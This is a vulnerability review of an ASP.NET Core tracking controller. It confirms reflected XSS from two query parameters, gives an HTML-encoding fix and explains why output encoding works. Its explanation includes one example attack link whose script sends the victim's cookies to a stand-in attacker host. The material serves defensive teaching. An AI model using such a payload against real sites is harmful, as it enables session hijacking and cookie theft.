## Verdict
Confirmed. Reflected Cross-Site Scripting (CWE-79).

## Source
`Request.Query["orderId"]` and `Request.Query["note"]` (lines 10-11) — both are attacker-controlled query-string values with no validation or encoding applied before use.

## Fix

```csharp
using System.Text.Encodings.Web;
using Microsoft.AspNetCore.Mvc;

namespace OrderPortal.Controllers
{
    public class TrackingController : Controller
    {
        [HttpGet("/tracking/confirm")]
        public IActionResult Confirm()
        {
            string orderId = Request.Query["orderId"];
            string customerNote = Request.Query["note"];

            string html = "<html><body>" +
                "<h2>Tracking Confirmation</h2>" +
                "<p>Order: " + HtmlEncoder.Default.Encode(orderId ?? string.Empty) + "</p>" +
                "<p>Note from customer: " + HtmlEncoder.Default.Encode(customerNote ?? string.Empty) + "</p>" +
                "</body></html>";

            return Content(html, "text/html");
        }
    }
}
```

## Explanation
The action builds an HTML response by string-concatenating raw query parameters directly into markup, then returns it via `Content(html, "text/html")`. Because the response is emitted as raw HTML with `text/html`, any `<script>`, `<img onerror=...>`, or other markup placed in `orderId` or `note` is sent to the browser and executed in the victim's session — a classic reflected XSS, exploitable simply by getting a victim to click a crafted link such as `/tracking/confirm?note=<script>document.location='https://evil.example/steal?c='+document.cookie</script>`.

The fix HTML-encodes each untrusted value at the point it is concatenated into the markup, using `System.Text.Encodings.Web.HtmlEncoder.Default.Encode(...)`. This converts `<`, `>`, `&`, `"`, and `'` into their HTML entity equivalents, so any injected markup renders as inert text instead of being parsed as tags or attributes. The `?? string.Empty` guards against a null reference if the query parameter is absent, since `HtmlEncoder.Encode` does not accept null.

Encoding at the output/sink point (rather than trying to "sanitize" the input on the way in) is the correct layer for this defense: it guarantees every value reaching the HTML sink is safe regardless of what upstream validation may or may not have done, and it does not corrupt legitimate values like an order ID that legitimately contains an ampersand. The more idiomatic long-term fix is to render this response through a Razor view with `@Model.OrderId` bindings — Razor auto-encodes interpolated values by default — but encoding at the concatenation site is the minimal, correct fix for the existing raw-string-building pattern and closes the vulnerability without changing the response shape.
